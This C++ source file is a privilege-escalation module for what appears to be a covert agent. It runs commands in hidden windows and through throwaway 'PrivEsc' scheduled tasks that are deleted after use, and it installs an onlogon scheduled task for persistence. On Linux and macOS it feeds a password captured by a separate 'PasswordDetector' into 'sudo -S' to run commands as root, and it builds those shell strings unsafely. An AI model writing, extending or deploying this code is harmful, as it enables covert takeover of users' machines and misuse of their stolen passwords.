#include "PrivilegeEscalation.h"
#include "PasswordDetector.h"

namespace PrivilegeEscalation {

#ifdef _WIN32
    bool isWindowsAdmin() {
        BOOL isAdmin = FALSE;
        PSID adminGroup = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        
        if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        
        return isAdmin == TRUE;
    }

bool requestElevation() {
        if (isWindowsAdmin()) return true;

        char szPath[MAX_PATH];
        if (GetModuleFileNameA(NULL, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;

            if (ShellExecuteExA(&sei)) {
                exit(0); 
                return true;
            }
        }
        return false;
    }

    std::string executeAsAdmin(const std::string& command) {
        if (!isWindowsAdmin()) {
            return executeViaScheduledTask(command);
        }

        std::string fullCommand = "cmd /c " + command;
        std::array<char, 128> buffer;
        std::string result;
        
        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        HANDLE hChildStd_OUT_Rd = NULL;
        HANDLE hChildStd_OUT_Wr = NULL;

        if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0)) {
            return "";
        }

        if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
            CloseHandle(hChildStd_OUT_Rd);
            CloseHandle(hChildStd_OUT_Wr);
            return "";
        }

        PROCESS_INFORMATION piProcInfo;
        STARTUPINFOA siStartInfo;
        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));

        siStartInfo.cb = sizeof(STARTUPINFOA);
        siStartInfo.hStdError = hChildStd_OUT_Wr;
        siStartInfo.hStdOutput = hChildStd_OUT_Wr;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
        siStartInfo.dwFlags |= STARTF_USESHOWWINDOW;
        siStartInfo.wShowWindow = SW_HIDE;

        char* cmdLine = new char[fullCommand.length() + 1];
        strcpy_s(cmdLine, fullCommand.length() + 1, fullCommand.c_str());

        BOOL success = CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &siStartInfo,
            &piProcInfo
        );

        delete[] cmdLine;
        CloseHandle(hChildStd_OUT_Wr);

        if (!success) {
            CloseHandle(hChildStd_OUT_Rd);
            return "";
        }

        DWORD dwRead;
        while (true) {
            if (!ReadFile(hChildStd_OUT_Rd, buffer.data(), buffer.size() - 1, &dwRead, NULL) || dwRead == 0) {
                break;
            }
            buffer[dwRead] = '\0';
            result += buffer.data();
        }

        WaitForSingleObject(piProcInfo.hProcess, INFINITE);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        CloseHandle(hChildStd_OUT_Rd);

        return result;
    }

    std::string executeViaScheduledTask(const std::string& command) {
        static int taskCounter = 0;
        char taskName[64];
        sprintf_s(taskName, sizeof(taskName), "PrivEsc_%d_%d", GetCurrentProcessId(), taskCounter++);
        
        char tempDir[MAX_PATH];
        GetTempPathA(MAX_PATH, tempDir);
        
        char batchFile[MAX_PATH];
        char outputFile[MAX_PATH];
        sprintf_s(batchFile, sizeof(batchFile), "%s%s.bat", tempDir, taskName);
        sprintf_s(outputFile, sizeof(outputFile), "%s%s.out", tempDir, taskName);
        
        std::ofstream batch(batchFile);
        if (!batch.is_open()) {
            return "";
        }
        
        batch << "@echo off\n";
        batch << "cd /d \"%TEMP%\"\n";
        batch << "cmd /c \"" << command << "\" > \"" << outputFile << "\" 2>&1\n";
        batch.close();
        
        char schtasksCreate[512];
        sprintf_s(schtasksCreate, sizeof(schtasksCreate),
            "schtasks /create /tn \"%s\" /tr \"%s\" /sc once /st 23:59 /f /rl highest 2>nul",
            taskName, batchFile);
        
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        char cmdLine[1024];
        sprintf_s(cmdLine, sizeof(cmdLine), "cmd /c %s", schtasksCreate);
        
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        sprintf_s(schtasksCreate, sizeof(schtasksCreate), "schtasks /run /tn \"%s\" 2>nul", taskName);
        sprintf_s(cmdLine, sizeof(cmdLine), "cmd /c %s", schtasksCreate);
        
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 2000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        int retries = 10;
        while (retries-- > 0) {
            Sleep(500);
            std::ifstream test(outputFile);
            if (test.good()) {
                test.close();
                break;
            }
            test.close();
        }
        
        std::string result;
        std::ifstream output(outputFile);
        if (output.is_open()) {
            std::string line;
            while (std::getline(output, line)) {
                result += line + "\n";
            }
            output.close();
            DeleteFileA(outputFile);
        }
        
        sprintf_s(schtasksCreate, sizeof(schtasksCreate), "schtasks /delete /tn \"%s\" /f 2>nul", taskName);
        sprintf_s(cmdLine, sizeof(cmdLine), "cmd /c %s", schtasksCreate);
        
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 1000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        DeleteFileA(batchFile);
        return result;
    }

    bool isAdmin() {
        return isWindowsAdmin();
    }

    bool escalatePrivileges() {
        if (isWindowsAdmin()) {
            return true;
        }
        return requestElevation();
    }

    std::string executeWithPrivileges(const std::string& command) {
        return executeAsAdmin(command);
    }

    bool requiresAdminAccess(const std::string& path) {
        try {
            fs::path p(path);
            std::string root = p.root_path().string();
            std::string lowerPath = p.string();
            std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::tolower);
            return lowerPath.find("c:\\windows") != std::string::npos ||
                   lowerPath.find("c:\\program files") != std::string::npos ||
                   lowerPath.find("system32") != std::string::npos;
        } catch (...) {
            return false;
        }
    }

    bool taskExists(const std::string& taskName) {
        char cmd[256];
        sprintf_s(cmd, sizeof(cmd), "schtasks /query /tn \"%s\" >nul 2>&1", taskName.c_str());
        int result = system(cmd);
        return result == 0;
    }

    bool setupPersistentTask(const std::string& exePath, const std::string& taskName) {
        std::string agentPath = exePath;
        
        if (agentPath.empty()) {
            char modulePath[MAX_PATH];
            GetModuleFileNameA(NULL, modulePath, MAX_PATH);
            agentPath = modulePath;
        }
        
        char deleteCmd[256];
        sprintf_s(deleteCmd, sizeof(deleteCmd), "schtasks /delete /tn \"%s\" /f 2>nul", taskName.c_str());
        system(deleteCmd);
        
        char createCmd[512];
        sprintf_s(createCmd, sizeof(createCmd),
            "schtasks /create /tn \"%s\" /tr \"\\\"%s\\\"\" /sc onlogon /rl limited /f",
            taskName.c_str(), agentPath.c_str());
        
        int result = system(createCmd);
        return result == 0;
    }

    bool launchViaTask(const std::string& taskName) {
        if (!taskExists(taskName)) {
            return false;
        }
        
        char cmd[256];
        sprintf_s(cmd, sizeof(cmd), "schtasks /run /tn \"%s\" 2>nul", taskName.c_str());
        
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        char cmdLine[512];
        sprintf_s(cmdLine, sizeof(cmdLine), "cmd /c %s", cmd);
        
        BOOL success = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (success) {
            WaitForSingleObject(pi.hProcess, 2000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return true;
        }
        
        return false;
    }

    bool deleteTask(const std::string& taskName) {
        char cmd[256];
        sprintf_s(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul", taskName.c_str());
        int result = system(cmd);
        return result == 0;
    }

    std::string getCurrentUsername() {
        char username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;
        
        if (GetUserNameA(username, &username_len)) {
            return std::string(username);
        }
        return "unknown";
    }
#elif defined(__APPLE__) || defined(__linux__)

    bool isRoot() {
        return geteuid() == 0;
    }

    bool hasSudoAccess() {
        int result = system("sudo -n true 2>/dev/null");
        return result == 0;
    }

    std::string getCurrentUsername() {
        const char* user = getenv("USER");
        if (user) {
            return std::string(user);
        }
        
        user = getenv("USERNAME");
        if (user) {
            return std::string(user);
        }
        
        uid_t uid = geteuid();
        struct passwd* pw = getpwuid(uid);
        if (pw && pw->pw_name) {
            return std::string(pw->pw_name);
        }
        
        return "";
    }

#if defined(__APPLE__)
    std::string executeWithSudo(const std::string& command, const std::string& password) {
        if (isRoot()) {
            std::array<char, 128> buffer;
            std::string result;
            PipeGuard pipe(POPEN(command.c_str(), "r"));
            if (!pipe.isValid()) {
                return "";
            }
            while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
                result += buffer.data();
            }
            return result;
        }

        std::string sudoCommand;
        if (!password.empty()) {
            sudoCommand = "echo '" + password + "' | sudo -S " + command;
        } else {
            sudoCommand = "sudo " + command;
        }

        std::array<char, 128> buffer;
        std::string result;
        PipeGuard pipe(POPEN(sudoCommand.c_str(), "r"));
        if (!pipe.isValid()) {
            return "";
        }
        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
        return result;
    }
#elif defined(__linux__)
    std::string executeWithSudo(const std::string& command, const std::string& username, const std::string& password) {
        if (isRoot()) {
            std::array<char, 128> buffer;
            std::string result;
            PipeGuard pipe(POPEN(command.c_str(), "r"));
            if (!pipe.isValid()) {
                return "";
            }
            while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
                result += buffer.data();
            }
            return result;
        }

        std::string sudoCommand;
        std::string user = username.empty() ? getCurrentUsername() : username;
        
        if (!password.empty()) {
            if (!user.empty()) {
                sudoCommand = "echo '" + password + "' | sudo -S -u " + user + " " + command;
            } else {
                sudoCommand = "echo '" + password + "' | sudo -S " + command;
            }
        } else {
            if (!user.empty()) {
                sudoCommand = "sudo -u " + user + " " + command;
            } else {
                sudoCommand = "sudo " + command;
            }
        }

        std::array<char, 128> buffer;
        std::string result;
        PipeGuard pipe(POPEN(sudoCommand.c_str(), "r"));
        if (!pipe.isValid()) {
            return "";
        }
        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
        return result;
    }
#endif

    bool isAdmin() {
        return isRoot();
    }

    bool escalatePrivileges() {
        if (isRoot()) {
            return true;
        }
        if (hasSudoAccess()) {
            return true;
        }
        if (PasswordDetector::hasPassword()) {
            std::string password = PasswordDetector::getLastPassword();
            std::string username = getCurrentUsername();
            std::string testCmd;
#if defined(__linux__)
            if (!username.empty()) {
                testCmd = "echo '" + password + "' | sudo -S -u " + username + " true 2>/dev/null";
            } else {
                testCmd = "echo '" + password + "' | sudo -S true 2>/dev/null";
            }
#else
            testCmd = "echo '" + password + "' | sudo -S true 2>/dev/null";
#endif
            int result = system(testCmd.c_str());
            if (result == 0) {
                return true;
            }
        }
        std::cerr << "[PrivilegeEscalation] Cannot escalate privileges. Please run with sudo.\n";
        return false;
    }

    std::string executeWithPrivileges(const std::string& command) {
        if (isRoot()) {
#if defined(__APPLE__)
            return executeWithSudo(command, "");
#else
            return executeWithSudo(command, "", "");
#endif
        }

        std::string username = getCurrentUsername();
        
        if (hasSudoAccess()) {
#if defined(__APPLE__)
            return executeWithSudo(command, "");
#else
            return executeWithSudo(command, username, "");
#endif
        }

        if (PasswordDetector::hasPassword()) {
            std::string password = PasswordDetector::getLastPassword();
#if defined(__APPLE__)
            return executeWithSudo(command, password);
#else
            return executeWithSudo(command, username, password);
#endif
        }

#if defined(__APPLE__)
        return executeWithSudo(command, "");
#else
        return executeWithSudo(command, username, "");
#endif
    }

    bool requiresAdminAccess(const std::string& path) {
        return path.find("/System") == 0 || path.find("/etc") == 0 || 
               path.find("/usr/bin") == 0 || path == "/";
    }
#endif

}
